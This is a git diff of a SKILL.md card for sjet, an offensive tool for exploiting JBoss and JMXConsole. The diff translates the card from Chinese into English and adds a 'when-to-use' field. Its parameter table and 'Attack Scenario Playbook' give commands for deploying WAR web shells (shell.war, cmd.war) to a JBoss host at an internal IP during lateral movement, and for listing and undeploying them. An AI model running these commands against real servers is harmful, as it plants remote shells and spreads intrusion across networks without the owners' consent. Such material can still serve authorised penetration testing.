@@ -2,37 +2,40 @@
 name: sjet-jboss
 description: "sjet: JBoss and JMXConsole exploitation. Signals: lateral movement, psexec, JBoss deployment, undeploy, list."
 zh-signals: "sjet: JBoss/JMXConsole 利用。信号:横向移动,psexec,JBoss 部署,卸载,列表。"
+when-to-use: >-
+  Use when a JBoss or JMXConsole instance is exposed and you want to deploy a WAR
+  web shell, list deployments, or undeploy during lateral movement.
 ---
 
 # sjet
 
-- 攻击大类:C31 远程服务横向移动
-- 上游仓库:https://github.com/h0ng10/sjet
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C31 Remote Service Lateral Movement
+- Upstream Repository: https://github.com/h0ng10/sjet
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/h0ng10/sjet && cd sjet
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python3 sjet.py 10.0.0.5 8080 deploy shell.war` | JBoss 部署 |
-| `undeploy shell` | 卸载 |
-| `list` | 列表 |
+| `python3 sjet.py 10.0.0.5 8080 deploy shell.war` | JBoss deployment |
+| `undeploy shell` | Undeploy |
+| `list` | List |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### JBoss/JMXConsole 利用
+### JBoss/JMXConsole exploitation
 
 ```bash
 python3 sjet.py 10.0.0.5 8080 deploy cmd.war
-# WAR 部署 shell
+# Deploy a WAR shell
 ```
 
-## 注意事项
+## Notes
 
-JBoss JMX 利用工具。
+JBoss JMX exploitation tool.
